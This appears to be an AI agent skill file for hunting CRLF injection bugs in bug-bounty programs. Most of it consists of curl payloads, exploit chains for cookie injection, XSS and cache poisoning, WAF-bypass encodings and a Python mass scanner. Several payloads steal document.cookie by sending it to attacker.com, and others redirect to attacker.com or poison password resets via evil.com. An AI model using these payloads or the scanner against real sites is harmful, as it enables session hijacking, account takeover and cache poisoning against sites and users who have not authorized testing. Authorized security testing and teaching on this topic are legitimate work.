---
name: hunt-crlf
description: CRLF injection — response splitting, header injection, XSS, cache poisoning, cookie injection. Must demonstrate concrete impact.
---

# CRLF INJECTION

Inject `%0d%0a` (CR+LF) into HTTP responses to manipulate headers, bodies, and behavior.

## WHERE TO LOOK

```
- URL params: ?redirect=, ?url=, ?next=, ?return=, ?continue=
- Headers: Referer, User-Agent, X-Forwarded-For, Host
- Path segments: /page/%0d%0aInjected-Header:value
- POST body: name, email, search, comment
- Cookies: session=evil%0d%0aSet-Cookie:hijacked
```

## DETECTION

```bash
for param in search name email redirect url next return continue user lang; do
  curl -s "https://target.com/?${param}=test%0d%0aInjected-Header:fuzzme" -I 2>/dev/null | grep -i "Injected-Header"
done
for hdr in Referer User-Agent X-Forwarded-For X-Forwarded-Host Accept-Language Cookie; do
  curl -s -H "${hdr}: test%0d%0aInjected-Header:fuzzme" "https://target.com/" -I 2>/dev/null | grep -i "Injected-Header"
done
curl -s "https://target.com/page%0d%0aInjected-Header:fuzzme" -I
curl -s "https://target.com/?q=test%0d%0a%0d%0a<h1>INJECTED</h1>" | grep "INJECTED"
```

## EXPLOIT CHAINS

### Chain 1: CRLF → Cookie Injection → ATO
```bash
curl -s "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:session=ATTACKER;Path=/;Domain=.target.com" -I
```

### Chain 2: CRLF → XSS → Session Hijack
```bash
curl -s "https://target.com/search?q=test%0d%0a%0d%0a<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
```

### Chain 3: CRLF → Cache Poisoning → Mass XSS
```bash
curl -s "https://target.com/page?lang=test%0d%0aX-Cache:HIT%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

### Chain 4: CRLF → Open Redirect → OAuth Theft
```bash
curl -s "https://target.com/callback?next=https://target.com%0d%0aLocation:https://attacker.com/steal" -I
```

### Chain 5: CRLF → Host Poisoning → Reset Poisoning
```bash
curl -s -H "Host: target.com%0d%0aX-Forwarded-Host:evil.com" "https://target.com/forgot-password"
```

## CURL PAYLOADS

```bash
curl -v "https://target.com/?q=test%0d%0aX-Injected:header"
curl -v "https://target.com/?q=test%250d%250aX-Injected:header"
curl -v "https://target.com/?q=test%C0%8D%C0%8AX-Injected:header"
curl -v "https://target.com/?q=test%0d%09X-Injected:header"
curl -v "https://target.com/?q=test%00%0d%0aX-Injected:header"
curl -v -H "Cookie: session=test%0d%0aSet-Cookie:hijacked" "https://target.com/"
curl -v -H "Referer: https://target.com%0d%0aX-Injected:header" "https://target.com/"
curl -v -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Injected:header" "https://target.com/"
```

## WAF BYPASS

```bash
curl -v "https://target.com/?q=%250d%250aX-Injected:header"          # Double encoding
curl -v "https://target.com/?q=%25250d%25250aX-Injected:header"      # Triple encoding
curl -v "https://target.com/?q=%E5%98%8A%E5%98%8DX-Injected:header" # Unicode
curl -v "https://target.com/?q=%C0%8D%C0%8AX-Injected:header"       # Overlong UTF-8
curl -v "https://target.com/?q=%00%0d%0aX-Injected:header"          # Null byte
curl -v --http2 -H "X-Inj: header%0d%0aX-Smuggled: true" "https://target.com/"
curl -v "https://target.com/?q=%0d%0ax-injected:header"              # Case variation
curl -v "https://target.com/?q=%0a%0dX-Injected:header"              # Newline variants
```

## CRLF IN DIFFERENT CONTEXTS

```bash
curl -s "https://target.com/?q=test%0d%0aSet-Cookie:admin=true" -I
curl -s "https://target.com/?q=test%0d%0aX-Frame-Options:" -I
curl -s "https://target.com/?q=test%0d%0aContent-Security-Policy:" -I
curl -s "https://target.com/redirect?url=%0d%0aSet-Cookie:session=hijacked%3BPath%3D/%3BDomain%3D.target.com" -I
curl -s "https://target.com/search?q=%0d%0a%0d%0a<svg/onload=fetch('https://attacker.com/steal?c='+document.cookie)>"
curl -s "https://target.com/?q=%0d%0a[FORGED] Admin login from attacker" -I
curl -s "https://target.com/page?utm=test%0d%0aX-Cache:HIT%0d%0aCache-Control:max-age=86400%0d%0a%0d%0a<script>alert(1)</script>"
```

## REAL BOUNTY EXAMPLES

| Program | Severity | Impact | Reward |
|---------|----------|--------|--------|
| Uber (HackerOne) | Critical | CRLF → cookie injection → ATO | $10,000 |
| Shopify (HackerOne) | High | CRLF → XSS in admin panel | $4,000 |
| GitLab (HackerOne) | High | CRLF → header injection → cache poisoning | $3,000 |
| Slack (HackerOne) | Medium | CRLF → response splitting → XSS | $2,000 |
| Twitch (HackerOne) | High | CRLF → Set-Cookie → session fixation | $3,500 |
| HackerOne (self) | Critical | CRLF → host header poisoning → ATO | $5,000 |
| Vimeo (HackerOne) | High | CRLF → XSS via redirect | $2,500 |
| Dropbox (HackerOne) | Critical | CRLF → response splitting → mass compromise | $8,000 |

## AUTOMATION SCRIPT

```python
#!/usr/bin/env python3
"""CRLF Scanner — mass parameter testing with WAF bypass."""
import requests, sys

PARAMS = ["search","q","query","name","email","redirect","url","next","return",
          "continue","lang","country","sort","filter","callback","redirect_uri",
          "return_to","dest","destination","redir","ref","site","go","link","to","out","view"]
HDRS = ["Referer","User-Agent","X-Forwarded-For","X-Forwarded-Host","X-Real-IP","Cookie","Host"]
PAYLOADS = ["%0d%0aX-Injected-Header:t","%0D%0AX-Injected-Header:t",
            "%250d%250aX-Injected-Header:t","%C0%8D%C0%8AX-Injected-Header:t"]
FINDINGS = []

def test_url(url, verbose=False):
    for payload in PAYLOADS:
        for param in PARAMS:
            try:
                r = requests.get(f"{url}?{param}=test{payload}", timeout=10, allow_redirects=False)
                if "X-Injected-Header" in str(r.headers):
                    FINDINGS.append({"url":url,"param":param,"type":"header","sev":"HIGH"})
                    print(f"[!] HEADER INJECTION: {param} in {url}")
                if "X-Injected-Header" in r.text:
                    FINDINGS.append({"url":url,"param":param,"type":"body","sev":"CRITICAL"})
                    print(f"[!] BODY INJECTION (XSS): {param} in {url}")
            except: pass
    try:
        r = requests.get(url, timeout=10, headers={"Cookie":"session=test%0d%0aSet-Cookie:crlf_test=y"})
        if "crlf_test" in str(r.headers.get("Set-Cookie","")):
            FINDINGS.append({"url":url,"param":"Cookie","type":"cookie","sev":"CRITICAL"})
            print(f"[!] COOKIE INJECTION: {url}")
    except: pass
    for hdr in HDRS[:4]:
        for payload in PAYLOADS[:2]:
            try:
                r = requests.get(url, timeout=10, headers={hdr:f"test{payload}"})
                if "X-Injected-Header" in str(r.headers):
                    FINDINGS.append({"url":url,"param":hdr,"type":"header","sev":"HIGH"})
                    print(f"[!] HEADER INJECTION via {hdr}: {url}")
            except: pass

def scan_file(fpath):
    with open(fpath) as f:
        urls = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    print(f"[*] Scanning {len(urls)} URLs...")
    for i, url in enumerate(urls):
        print(f"[*] ({i+1}/{len(urls)}) {url}")
        test_url(url)
    print(f"\n[+] Found {len(FINDINGS)} issues.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python crlf_scanner.py <url_or_file> [-v]"); sys.exit(1)
    target = sys.argv[1]
    if target.startswith("http"): test_url(target)
    else: scan_file(target)
    if FINDINGS:
        print("\n[+] FINDINGS:")
        for f in FINDINGS: print(f"  [{f['sev']}] {f['type']}: {f['param']} in {f['url']}")
```

## REPORT TEMPLATE

```
Title: CRLF Injection in [PARAMETER] leading to [IMPACT]
Severity: Critical/High
Steps: curl -v "https://target.com/?param=test%0d%0aSet-Cookie:hijacked=1"
Impact: [ATO / XSS / Cache Poisoning / Mass Account Compromise]
Remediation: Encode or strip CR/LF from all user input before HTTP header construction
```
